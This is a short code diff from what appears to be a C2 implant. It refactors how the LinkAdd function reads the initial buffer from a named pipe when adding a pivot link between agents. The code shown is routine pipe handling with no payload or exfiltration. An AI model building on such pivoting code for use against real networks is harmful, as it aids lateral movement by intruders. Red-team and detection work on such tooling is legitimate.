@@ -116,42 +116,11 @@ BOOL LinkAdd( PCHAR TaskUuid, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen, UIN
 
 
     /* Read the initial buffer */
-    DWORD BytesAvailable = 0;
-    do
+    if ( !PackageReadPipe(hPipe, outBuf, outLen) )
     {
-        if ( PeekNamedPipe( hPipe, NULL, 0, NULL, &BytesAvailable, NULL ) )
-        {
-            if ( BytesAvailable > 0 )
-            {
-                _dbg("Bytes available - %d bytes", BytesAvailable);
-                
-                *outBuf = LocalAlloc(LPTR, BytesAvailable);
-                memset(*outBuf, 0, BytesAvailable);
-
-                if ( ReadFile( hPipe, *outBuf, BytesAvailable, outLen, NULL ) )
-                {
-                    if ( *outLen < BytesAvailable )
-                    {
-                        _err("Didn't read all the bytes from the pipe. Bytes read %d ", *outLen);
-                    }
-
-                    break;
-                }
-                else
-                {
-                    _err( "ReadFile: Failed[%d]\n", GetLastError() );
-                    CloseHandle(hPipe);
-                    return FALSE;
-                }
-            }
-        }
-        else
-        {
-            _dbg( "PeekNamedPipe: Failed[%d]\n", GetLastError() );
-            CloseHandle(hPipe);
-            return FALSE;
-        }
-    } while ( TRUE );
+        _err("Failed to read initial buffer from pipe. ERROR : %d", GetLastError());
+        return FALSE;
+    }
 
 
     /* Add this Pivot Link to list */
